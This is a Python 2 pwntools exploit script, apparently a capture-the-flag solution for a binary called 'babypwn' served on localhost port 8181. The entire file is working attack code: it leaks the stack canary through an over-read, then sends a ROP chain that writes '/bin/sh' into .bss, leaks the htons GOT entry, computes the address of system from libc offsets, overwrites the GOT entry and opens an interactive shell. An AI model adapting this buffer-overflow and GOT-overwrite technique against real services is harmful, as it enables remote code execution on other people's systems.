#!/usr/bin/env python2
# coding: utf-8

from pwn import *

e, p = (None, None)

pr = 0x08048589
ppr = 0x08048b84
recv_msg = 0x08048907
send_msg = 0x080488B1

filename = './babypwn'
context.log_level = 'debug'
def select_menu(idx):
    p.recvuntil('Select menu > ')
    p.sendline(str(idx))

def input_message(msg):
    p.recvuntil('Input Your Message : ')
    p.send(msg)
    string = msg.split('\x00')[0]
    p.recv(len(msg))

def get_canary():
    select_menu(1)

    payload = "A" * (0x34 - 0xc + 1)
    p.recvuntil('Input Your Message : ')
    p.send(payload)
    p.recvuntil(payload)
    canary = u32(p.recv(3).rjust(4, '\x00'))

    return canary

def exploit(canary):
    select_menu(1)

    bss = e.bss() + 0x100
    binsh = '////////bin/sh;sh;sh;\x00'

    libc = e.libc
    offset = libc.symbols['htons'] - libc.symbols['system']

    payload = 'A' * (0x34 - 0xc)
    payload += p32(canary)
    payload += 'B' * 8
    payload += p32(recv_msg)
    payload += p32(ppr)
    payload += p32(bss)
    payload += p32(len(binsh))
    
    payload += p32(send_msg)
    payload += p32(pr)
    payload += p32(e.got['htons'])
    
    payload += p32(recv_msg)
    payload += p32(ppr)
    payload += p32(e.got['htons'])
    payload += p32(4)

    payload += p32(send_msg)
    payload += p32(pr)
    payload += p32(bss)

    payload += p32(e.plt['htons'])
    payload += 'AAAA'
    payload += p32(bss)

    input_message(payload)
    
    select_menu(3)
    p.recv(1024)
    sleep(0.3)

    p.send(binsh)

    htons = u32(p.recv(4))
    system = htons - offset

    log.success('htons : %#x' % htons)
    log.success('system : %#x' % system)

    p.send(p32(system))

def main():
    global e
    global p

    e = ELF(filename)
    p = remote('127.0.0.1', 8181)

    canary = get_canary()
    log.success('canary : %#x' % canary)
    exploit(canary)
    p.interactive()

if __name__ == '__main__':
    main()

